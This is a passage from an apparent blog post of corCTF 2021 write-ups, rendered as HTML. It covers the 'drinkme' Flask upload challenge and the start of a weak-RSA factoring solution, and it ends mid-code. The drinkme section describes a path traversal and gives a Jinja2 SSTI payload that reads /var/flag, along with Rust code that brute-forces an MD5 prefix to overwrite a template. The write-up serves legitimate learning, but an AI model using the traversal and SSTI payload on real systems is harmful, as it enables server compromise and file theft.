@@ -1,0 +1,2191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>corCTF 2021</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+      <li>
+        <a href="https://tsheinen.github.io/corctf-2021/#drinkme">drinkme</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/corctf-2021/#app-py">app.py</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/corctf-2021/#4096">4096</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/corctf-2021/#source-py">source.py</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/corctf-2021/#output-txt">output.txt</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/corctf-2021/#cshell">cshell</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/corctf-2021/#cshell-c">Cshell.c</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/corctf-2021/#yeetcode">yeetcode</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/corctf-2021/#devme">devme</a>
+        <ul>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/corctf-2021/#fibinary">fibinary</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/corctf-2021/#enc-py">enc.py</a>
+            </li>
+          
+            <li>
+                <a href="https://tsheinen.github.io/corctf-2021/#flag-enc">flag.enc</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+      <li>
+        <a href="https://tsheinen.github.io/corctf-2021/#chainblock">chainblock</a>
+        <ul>
+          
+            <li>
+                <a href="https://tsheinen.github.io/corctf-2021/#chainblock-c">chainblock.c</a>
+            </li>
+          
+        </ul>
+      </li>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>corCTF 2021</h1>
+    </header>
+
+    <div class="content">
+        <p>I competed with ret2rev and placed in 98th place!</p>
+<span id="continue-reading"></span><h1 id="drinkme"><a href="/corctf-2021/drinkme">drinkme</a></h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>Are you thirsty? Why don&#39;t you try some of our drinks at our new store, drinkme! Leave a message on the wall too when you&#39;re done.
+</span><span>NOTE: Flag is at /var/flag
+</span><span>NOTE: This challenge uses per-team instances. Please test locally and don&#39;t launch one until you have a working exploit.
+</span><span>NOTE: The drinkme instancer takes a bit of time (&lt; 1 min) to start the container, please be patient.
+</span><span>https://drinkme.be.ax
+</span></code></pre>
+<p>We get all source again and I'm just including the server file for brevity.</p>
+<h2 id="app-py">app.py</h2>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">##!/usr/bin/env python3
+</span><span style="color:#ffa759;">from </span><span>flask </span><span style="color:#ffa759;">import </span><span>Flask</span><span style="color:#ccc9c2cc;">, </span><span>flash</span><span style="color:#ccc9c2cc;">, </span><span>request</span><span style="color:#ccc9c2cc;">, </span><span>redirect</span><span style="color:#ccc9c2cc;">, </span><span>url_for</span><span style="color:#ccc9c2cc;">, </span><span>render_template</span><span style="color:#ccc9c2cc;">, </span><span>send_from_directory
+</span><span style="color:#ffa759;">import </span><span>os
+</span><span style="color:#ffa759;">import </span><span>hashlib
+</span><span>app </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">Flask</span><span>(__name__)
+</span><span>app</span><span style="color:#f29e74;">.</span><span>secret_key </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&#39;537472656c6c6963206973206d79206661766f72697465206d656d626572206f6620436f52&#39; </span><span style="font-style:italic;color:#5c6773;"># Don&#39;t bother trying to exploit - this is just to get flash() to work because I&#39;m too lazy to make proper error messages
+</span><span style="font-style:italic;color:#5c6773;">## stuff for per-team instances, can probably ignore this line
+</span><span style="color:#ffa759;">if </span><span>os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getenv</span><span>(</span><span style="color:#bae67e;">&#39;PORT&#39;</span><span>) </span><span style="color:#f29e74;">is not </span><span style="color:#ffcc66;">None</span><span>:
+</span><span>    app</span><span style="color:#f29e74;">.</span><span>config[</span><span style="color:#bae67e;">&#39;SERVER_NAME&#39;</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#ffa759;">f</span><span style="color:#bae67e;">&quot;</span><span>{os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">getenv</span><span>(</span><span style="color:#bae67e;">&#39;PORT&#39;</span><span>)}</span><span style="color:#bae67e;">.drinkme.be.ax&quot;
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/&#39;</span><span>)
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/index&#39;</span><span>)
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">index</span><span>():
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">render_template</span><span>(</span><span style="color:#bae67e;">&#39;index.html&#39;</span><span>)
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/upload&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">methods</span><span style="color:#f29e74;">=</span><span>[</span><span style="color:#bae67e;">&#39;POST&#39;</span><span>])
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">upload</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span style="color:#bae67e;">&#39;file&#39; </span><span style="color:#f29e74;">not in </span><span>request</span><span style="color:#f29e74;">.</span><span>files:
+</span><span>        </span><span style="color:#ffd580;">flash</span><span>(</span><span style="color:#bae67e;">&#39;You, uh, kinda need a file.&#39;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">redirect</span><span>(</span><span style="color:#ffd580;">url_for</span><span>(</span><span style="color:#bae67e;">&#39;index&#39;</span><span>))
+</span><span>    </span><span style="color:#ffa759;">if </span><span style="color:#bae67e;">&#39;type&#39; </span><span style="color:#f29e74;">not in </span><span>request</span><span style="color:#f29e74;">.</span><span>form:
+</span><span>        </span><span style="color:#ffd580;">flash</span><span>(</span><span style="color:#bae67e;">&#39;Please specify a filetype.&#39;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">redirect</span><span>(</span><span style="color:#ffd580;">url_for</span><span>(</span><span style="color:#bae67e;">&#39;index&#39;</span><span>))
+</span><span>    file </span><span style="color:#f29e74;">= </span><span>request</span><span style="color:#f29e74;">.</span><span>files[</span><span style="color:#bae67e;">&#39;file&#39;</span><span>]
+</span><span>    UPLOAD_FOLDER </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&#39;./wall/&#39; </span><span style="color:#f29e74;">+ </span><span>request</span><span style="color:#f29e74;">.</span><span>form[</span><span style="color:#bae67e;">&#39;type&#39;</span><span>]
+</span><span>    </span><span style="color:#ffa759;">if </span><span>file</span><span style="color:#f29e74;">.</span><span>filename </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&#39;&#39;</span><span>:
+</span><span>        </span><span style="color:#ffd580;">flash</span><span>(</span><span style="color:#bae67e;">&#39;You uh, kinda need a file.&#39;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">redirect</span><span>(</span><span style="color:#ffd580;">url_for</span><span>(</span><span style="color:#bae67e;">&#39;index&#39;</span><span>))
+</span><span>    </span><span style="color:#ffa759;">if </span><span>file:
+</span><span>        filename </span><span style="color:#f29e74;">= </span><span>hashlib</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">md5</span><span>(file</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span>())</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">hexdigest</span><span>()[</span><span style="color:#ccc9c2cc;">:</span><span style="color:#ffcc66;">5</span><span>] </span><span style="color:#f29e74;">+ </span><span style="color:#bae67e;">&#39;.&#39; </span><span style="color:#f29e74;">+ </span><span style="color:#bae67e;">&#39;.&#39;</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span>(file</span><span style="color:#f29e74;">.</span><span>filename</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#bae67e;">&#39;.&#39;</span><span>)[</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">:</span><span>])
+</span><span>        file</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">seek</span><span>(</span><span style="color:#ffcc66;">0</span><span>)
+</span><span>        </span><span style="color:#ffa759;">try</span><span>:
+</span><span>            file</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">save</span><span>(os</span><span style="color:#f29e74;">.</span><span>path</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">join</span><span>(UPLOAD_FOLDER</span><span style="color:#ccc9c2cc;">, </span><span>filename))
+</span><span>            </span><span style="color:#ffd580;">flash</span><span>(</span><span style="color:#bae67e;">&#39;File successfully uploaded!&#39;</span><span>)
+</span><span>            </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">redirect</span><span>(</span><span style="color:#ffd580;">url_for</span><span>(</span><span style="color:#bae67e;">&#39;index&#39;</span><span>))
+</span><span>        </span><span style="color:#ffa759;">except</span><span>:
+</span><span>            </span><span style="color:#ffd580;">flash</span><span>(</span><span style="color:#bae67e;">&#39;Error while uploading file.&#39;</span><span>)
+</span><span>            </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">redirect</span><span>(</span><span style="color:#ffd580;">url_for</span><span>(</span><span style="color:#bae67e;">&#39;index&#39;</span><span>))
+</span><span>    
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/wall&#39;</span><span>)
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">wall</span><span>():
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">render_template</span><span>(</span><span style="color:#bae67e;">&#39;guest_wall.html&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">images</span><span style="color:#f29e74;">=</span><span>os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">listdir</span><span>(</span><span style="color:#bae67e;">&quot;wall/image&quot;</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">text</span><span style="color:#f29e74;">=</span><span>os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">listdir</span><span>(</span><span style="color:#bae67e;">&quot;wall/text&quot;</span><span>)</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">videos</span><span style="color:#f29e74;">=</span><span>os</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">listdir</span><span>(</span><span style="color:#bae67e;">&quot;wall/video&quot;</span><span>)) </span><span style="font-style:italic;color:#5c6773;"># Is this bad coding? Yes. Do I care? No.
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/wall/&lt;path:path&gt;&#39;</span><span>) </span><span style="font-style:italic;color:#5c6773;"># I don&#39;t even use flask so this is probably implemented completely wrong pls dont flame me
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">return_file</span><span>(</span><span style="color:#ffcc66;">path</span><span>):
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">send_from_directory</span><span>(</span><span style="color:#bae67e;">&quot;wall&quot;</span><span style="color:#ccc9c2cc;">, </span><span>path)
+</span><span>    
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/americano&#39;</span><span>)
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">beef</span><span>():
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">render_template</span><span>(</span><span style="color:#bae67e;">&#39;americano.html&#39;</span><span>)
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/cappuccino&#39;</span><span>)
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">pork</span><span>():
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">render_template</span><span>(</span><span style="color:#bae67e;">&#39;cappuccino.html&#39;</span><span>)
+</span><span style="color:#ccc9c2cc;">@</span><span>app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">route</span><span>(</span><span style="color:#bae67e;">&#39;/decaf&#39;</span><span>)
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">mutton</span><span>():
+</span><span>    </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">render_template</span><span>(</span><span style="color:#bae67e;">&#39;decaf.html&#39;</span><span>)
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&#39;__main__&#39;</span><span>:
+</span><span>    app</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">run</span><span>(</span><span style="color:#ffcc66;">host </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&#39;0.0.0.0&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">port </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">5000</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">debug</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">True</span><span>)
+</span></code></pre>
+<p>So the first thing I noticed was that it was concatenating unchecked input for the upload path and that's gross. By forging a type to include .., we can make it upload our file anywhere we want. I immediately went to "overwrite server files" and was disappointed because we don't control the filename; It's derived from the first five characters of the file md5 hash + "." + file extension. I was looking at the templates: americano.html, cappuccino.html, and <em>decaf.html</em> when it clicked. "decaf" is valid hexadecimal characters which means if we upload an html file that hashes to "decaf*" it will upload decaf.html. I did the only reasonable thing -- make an SSTI payload to read /var/flag and then brute forced for padding which hashed to that.</p>
+<pre data-lang="rust" style="background-color:#212733;color:#ccc9c2;" class="language-rust "><code class="language-rust" data-lang="rust"><span style="color:#ffa759;">use </span><span>rand</span><span style="color:#f29e74;">::</span><span>{thread_rng</span><span style="color:#ccc9c2cc;">,</span><span> Rng}</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">use </span><span>rand</span><span style="color:#f29e74;">::</span><span>distributions</span><span style="color:#f29e74;">::</span><span>Alphanumeric</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">fn </span><span style="color:#ffd580;">main</span><span>() {
+</span><span>    </span><span style="color:#ffa759;">let</span><span> base </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;{{  self._TemplateReference__context.cycler.__init__.__globals__.__builtins__.open(&#39;/var/flag&#39;,&#39;r&#39;).read() }}&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#ffa759;">let </span><span>(found</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f29e74;">_</span><span>) </span><span style="color:#f29e74;">= </span><span>std</span><span style="color:#f29e74;">::</span><span>iter</span><span style="color:#f29e74;">::</span><span>repeat(())</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">map</span><span>(|_| {
+</span><span>        </span><span style="color:#ffa759;">let mut</span><span> attempt </span><span style="color:#f29e74;">=</span><span> base</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">to_string</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>        </span><span style="color:#ffa759;">for</span><span> i </span><span style="color:#f29e74;">in </span><span style="color:#f28779;">thread_rng</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">sample_iter</span><span>(</span><span style="color:#f29e74;">&amp;</span><span>Alphanumeric)
+</span><span>            </span><span style="color:#f29e74;">.</span><span style="color:#f28779;">take</span><span>(</span><span style="color:#ffcc66;">100</span><span>) {
+</span><span>            attempt</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">push</span><span>(i </span><span style="color:#f29e74;">as </span><span style="color:#ffa759;">char</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>        }
+</span><span>        </span><span style="color:#ffa759;">let</span><span> digest </span><span style="color:#f29e74;">= </span><span>md5</span><span style="color:#f29e74;">::</span><span>compute(</span><span style="color:#f29e74;">&amp;</span><span>attempt)</span><span style="color:#ccc9c2cc;">;
+</span><span>        (attempt</span><span style="color:#ccc9c2cc;">, </span><span style="color:#f28779;">format!</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">{:x}</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span> digest)[</span><span style="color:#f29e74;">..</span><span style="color:#ffcc66;">5</span><span>]</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">to_string</span><span>())
+</span><span>    })</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">find</span><span>(|(_</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">x</span><span>)| x </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;decaf&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">unwrap</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>    </span><span style="color:#f28779;">println!</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">{}</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span> found)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>I didn't save the flag so I'll grab it from some other writeup and update this later.</p>
+<h1 id="4096"><a href="/corctf-2021/4096">4096</a></h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>I heard 4096 bit RSA is secure, so I encrypted the flag with it.
+</span></code></pre>
+<p>Well, it sure should be secure -- let's take a look at the provided files.</p>
+<h4 id="source-py">source.py</h4>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">from </span><span>Crypto</span><span style="color:#f29e74;">.</span><span>Util</span><span style="color:#f29e74;">.</span><span>number </span><span style="color:#ffa759;">import </span><span>getPrime</span><span style="color:#ccc9c2cc;">, </span><span>bytes_to_long
+</span><span style="color:#ffa759;">from </span><span>private </span><span style="color:#ffa759;">import </span><span>flag
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">prod</span><span>(</span><span style="color:#ffcc66;">lst</span><span>):
+</span><span>	ret </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">1
+</span><span>	</span><span style="color:#ffa759;">for </span><span>num </span><span style="color:#ffa759;">in </span><span>lst:
+</span><span>		ret </span><span style="color:#f29e74;">*= </span><span>num
+</span><span>	</span><span style="color:#ffa759;">return </span><span>ret
+</span><span>m </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">bytes_to_long</span><span>(flag)
+</span><span>primes </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#ffd580;">getPrime</span><span>(</span><span style="color:#ffcc66;">32</span><span>) </span><span style="color:#ffa759;">for </span><span style="font-style:italic;color:#5ccfe6;">_ </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#ffcc66;">128</span><span>)]
+</span><span>n </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">prod</span><span>(primes)
+</span><span>e </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">65537
+</span><span style="color:#f28779;">print</span><span>(n)
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#f28779;">pow</span><span>(m</span><span style="color:#ccc9c2cc;">, </span><span>e</span><span style="color:#ccc9c2cc;">, </span><span>n))
+</span></code></pre>
+<h4 id="output-txt">output.txt</h4>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>50630448182626893495464810670525602771527685838257974610483435332349728792396826591558947027657819590790590829841808151825744184405725893984330719835572507419517069974612006826542638447886105625739026433810851259760829112944769101557865474935245672310638931107468523492780934936765177674292815155262435831801499197874311121773797041186075024766460977392150443756520782067581277504082923534736776769428755807994035936082391356053079235986552374148782993815118221184577434597115748782910244569004818550079464590913826457003648367784164127206743005342001738754989548942975587267990706541155643222851974488533666334645686774107285018775831028090338485586011974337654011592698463713316522811656340001557779270632991105803230612916547576906583473846558419296181503108603192226769399675726201078322763163049259981181392937623116600712403297821389573627700886912737873588300406211047759637045071918185425658854059386338495534747471846997768166929630988406668430381834420429162324755162023168406793544828390933856260762963763336528787421503582319435368755435181752783296341241853932276334886271511786779019664786845658323166852266264286516275919963650402345264649287569303300048733672208950281055894539145902913252578285197293
+</span><span>15640629897212089539145769625632189125456455778939633021487666539864477884226491831177051620671080345905237001384943044362508550274499601386018436774667054082051013986880044122234840762034425906802733285008515019104201964058459074727958015931524254616901569333808897189148422139163755426336008738228206905929505993240834181441728434782721945966055987934053102520300610949003828413057299830995512963516437591775582556040505553674525293788223483574494286570201177694289787659662521910225641898762643794474678297891552856073420478752076393386273627970575228665003851968484998550564390747988844710818619836079384152470450659391941581654509659766292902961171668168368723759124230712832393447719252348647172524453163783833358048230752476923663730556409340711188698221222770394308685941050292404627088273158846156984693358388590950279445736394513497524120008211955634017212917792675498853686681402944487402749561864649175474956913910853930952329280207751998559039169086898605565528308806524495500398924972480453453358088625940892246551961178561037313833306804342494449584581485895266308393917067830433039476096285467849735814999851855709235986958845331235439845410800486470278105793922000390078444089105955677711315740050638
+</span></code></pre>
+<p>The issue, here, is that while it is indeed 4096 bits, it isn't a very well chosen 4096 bits. Direct factorization isn't usually useful when breaking RSA because the numbers involved are so large, but in this case we know that they aren't large -- every factor is bounded by 32 bits.  I used a neat tool called <a href="https://github.com/DarkenCode/yafu">yafu</a> to factor it.</p>
+<details>
+<summary>Primes</summary>
+<pre lang="text">
+<code>
+P10 = 4098491081
+P10 = 4135004413
+P10 = 3279018511
+P10 = 2230630973
+P10 = 3180301633
+P10 = 2148630611
+P10 = 4056085883
+P10 = 2216411683
+P10 = 2647129697
+P10 = 3278196319
+P10 = 2959325459
+P10 = 2752963847
+P10 = 2719924183
+P10 = 2657405087
+P10 = 2963383867
+P10 = 3130133681
+P10 = 3335574511
+P10 = 3539958743
+P10 = 3648309311
+P10 = 3012495907
+P10 = 4235456317
+P10 = 2240170147
+P10 = 2293226687
+P10 = 3716991893
+P10 = 3035438359
+P10 = 4152726959
+P10 = 3961738709
+P10 = 2223202649
+P10 = 2424270803
+P10 = 3398567593
+P10 = 3959814431
+P10 = 2459187103
+P10 = 2371079143
+P10 = 2575495753
+P10 = 2932152359
+P10 = 3865448239
+P10 = 4205028467
+P10 = 2733527227
+P10 = 3991834969
+P10 = 4140261491
+P10 = 4252196909
+P10 = 3646337561
+P10 = 4218138251
+P10 = 3854175641
+P10 = 2491570349
+P10 = 4091945483
+P10 = 2322142411
+P10 = 3943871257
+P10 = 3522596999
+P10 = 3346647649
+P10 = 3760232953
+P10 = 4227099257
+P10 = 3013564231
+P10 = 2525697263
+P10 = 3684423151
+P10 = 3083881387
+P10 = 3978832967
+P10 = 3589083991
+P10 = 3625437121
+P10 = 4045323871
+P10 = 2710524571
+P10 = 2444333767
+P10 = 2695978183
+P10 = 3380851417
+P10 = 2602521199
+P10 = 2944751701
+P10 = 2572542211
+P10 = 2753147143
+P10 = 3638373857
+P10 = 3789253133
+P10 = 2661720221
+P10 = 3488338697
+P10 = 2858807113
+P10 = 3833824031
+P10 = 3464370241
+P10 = 2682518317
+P10 = 3923208001
+P10 = 2772696307
+P10 = 2746638019
+P10 = 2724658201
+P10 = 3291377941
+P10 = 3303691121
+P10 = 3686523713
+P10 = 3417563069
+P10 = 3994425601
+P10 = 2824169389
+P10 = 3200434847
+P10 = 3721186793
+P10 = 3359249393
+P10 = 2436598001
+P10 = 2278427881
+P10 = 2707095227
+P10 = 2949007619
+P10 = 2510750149
+P10 = 3057815377
+P10 = 2703629041
+P10 = 4141964923
+P10 = 2388797093
+P10 = 2365186141
+P10 = 4276173893
+P10 = 2854321391
+P10 = 3177943303
+P10 = 3487902133
+P10 = 3174322859
+P10 = 2841115943
+P10 = 3860554891
+P10 = 3285444073
+P10 = 2636069911
+P10 = 3319529377
+P10 = 3411506629
+P10 = 2672301743
+P10 = 3238771411
+P10 = 3833706949
+P10 = 3811207403
+P10 = 4073647147
+P10 = 3623581037
+P10 = 3453863503
+P10 = 3056689019
+P10 = 3861767519
+P10 = 3986329331
+P10 = 3941016503
+P10 = 3789746923
+P10 = 3228764447
+P10 = 4198942673
+P10 = 4270521797
+P10 = 4006267823
+P10 = 2157385673
+P10 = 2944722127
+</code>
+</pre>
+</details>
+<p>With the primes in hand, we can just decrypt it as usual. Originally I used sympy.totient to solve for the totient (took a couple minutes but worked), but I realized after that the constant calculation we use in RSA with two primes <code>(P-1)(Q-1)</code> is correct for the product of any number of primes, so I used that in my final solution.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#ffa759;">import </span><span>gmpy
+</span><span style="color:#ffa759;">from </span><span>Crypto</span><span style="color:#f29e74;">.</span><span>Util</span><span style="color:#f29e74;">.</span><span>number </span><span style="color:#ffa759;">import </span><span>getPrime</span><span style="color:#ccc9c2cc;">, </span><span>bytes_to_long</span><span style="color:#ccc9c2cc;">, </span><span>long_to_bytes
+</span><span>N </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">50630448182626893495464810670525602771527685838257974610483435332349728792396826591558947027657819590790590829841808151825744184405725893984330719835572507419517069974612006826542638447886105625739026433810851259760829112944769101557865474935245672310638931107468523492780934936765177674292815155262435831801499197874311121773797041186075024766460977392150443756520782067581277504082923534736776769428755807994035936082391356053079235986552374148782993815118221184577434597115748782910244569004818550079464590913826457003648367784164127206743005342001738754989548942975587267990706541155643222851974488533666334645686774107285018775831028090338485586011974337654011592698463713316522811656340001557779270632991105803230612916547576906583473846558419296181503108603192226769399675726201078322763163049259981181392937623116600712403297821389573627700886912737873588300406211047759637045071918185425658854059386338495534747471846997768166929630988406668430381834420429162324755162023168406793544828390933856260762963763336528787421503582319435368755435181752783296341241853932276334886271511786779019664786845658323166852266264286516275919963650402345264649287569303300048733672208950281055894539145902913252578285197293
